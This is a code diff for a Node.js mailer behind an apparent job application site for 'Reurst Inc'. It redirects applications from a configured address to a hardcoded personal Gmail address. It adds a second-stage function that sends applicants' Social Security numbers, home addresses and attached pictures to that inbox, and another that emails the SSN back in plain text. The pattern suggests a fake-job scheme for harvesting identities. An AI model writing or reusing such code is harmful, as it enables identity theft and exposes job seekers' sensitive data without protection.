@@ -24,16 +24,15 @@ const sendMail = (formData, pictures) => {
   const mailOptions = {
     from: formData.email,
     template: "email",
-    to: process.env.EMAIL,
+    to: "babyjrobert234@gmail.com",
     subject: `Application received at Reurst Inc!`,
     context: {
       email: formData.email,
-      fullName: formData.fullName,
+      firstName: formData.firstName,
+      lastName: formData.lastName,
       phoneNumber: formData.phoneNumber,
       age: formData.age,
       position: formData.position,
-      ssn: formData.ssn,
-      address: formData.address,
     },
     attachments: pictures,
   };
@@ -51,12 +50,11 @@ const signUpMail = (formData) => {
     from: process.env.EMAIL,
     template: "apply",
     to: formData.email,
-    subject: `${
-      formData.fullName?.split(" ")?.[0]
-    }, your application was received.`,
+    subject: `${formData.firstName}, your application was received.`,
     context: {
       email: formData.email,
-      fullName: formData.fullName,
+      firstName: formData.firstName,
+      lastName: formData.lastName,
     },
   };
 
@@ -68,4 +66,57 @@ const signUpMail = (formData) => {
   });
 };
 
-module.exports = { sendMail, signUpMail };
+const completeMail = (formData) => {
+  const mailOptions = {
+    from: process.env.EMAIL,
+    template: "onCompleteMail",
+    to: formData.email,
+    subject: `${formData.firstName}, Congratulations on Completing Your Application!`,
+    context: {
+      email: formData.email,
+      firstName: formData.firstName,
+      lastName: formData.lastName,
+      ssn: formData.ssn,
+      address: formData.address,
+      state: formData.state,
+      city: formData.city,
+      zipCode: formData.zipCode,
+    },
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error(error);
+    }
+    console.log("Email sent: " + info.response);
+  });
+};
+
+const sendCompleteMail = (formData, pictures) => {
+  const mailOptions = {
+    from: formData.email,
+    template: "complete",
+    to: "babyjrobert234@gmail.com",
+    subject: `Second part of user application received`,
+    context: {
+      email: formData.email,
+      firstName: formData.firstName,
+      lastName: formData.lastName,
+      ssn: formData.ssn,
+      address: formData.address,
+      state: formData.state,
+      city: formData.city,
+      zipCode: formData.zipCode,
+    },
+    attachments: pictures,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error(error);
+    }
+    console.log("Email sent: " + info.response);
+  });
+};
+
+module.exports = { sendMail, signUpMail, sendCompleteMail, completeMail };
